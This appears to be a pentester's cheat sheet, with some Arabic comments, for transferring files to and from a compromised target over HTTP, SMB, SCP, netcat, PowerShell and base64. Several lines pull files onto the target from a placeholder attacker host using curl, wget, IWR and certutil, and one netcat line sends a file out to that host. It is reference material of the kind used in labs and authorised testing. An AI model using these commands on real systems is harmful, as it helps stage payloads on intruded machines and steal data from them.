# File Transfers

## HTTP
```bash
python3 -m http.server 8000                        # attacker
curl http://<attacker_ip>:8000/file -o file         # target (curl)
wget http://<attacker_ip>:8000/file                 # target (wget)
```

## SMB
```bash
impacket-smbserver share . -smb2support             # attacker
copy \\<attacker_ip>\share\file.exe               # target (Windows cmd)
```

## SCP / SSH
```bash
scp file user@<IP>:/tmp/
scp user@<IP>:/path/file .
```

## Netcat (بدون HTTP/SSH)
```bash
nc -lvnp 4444 > received_file        # استقبال
nc <attacker_ip> 4444 < file_to_send # إرسال
```

## PowerShell (Windows target)
```powershell
IWR -Uri http://<attacker_ip>:8000/file -OutFile file.exe
certutil -urlcache -f http://<attacker_ip>:8000/file file.exe
```

## Base64 (لما فيه فلترة)
```bash
base64 -w0 file > file.b64          # attacker: encode
# انسخ المحتوى يدويًا على الهدف ثم:
base64 -d file.b64 > file           # target: decode
```
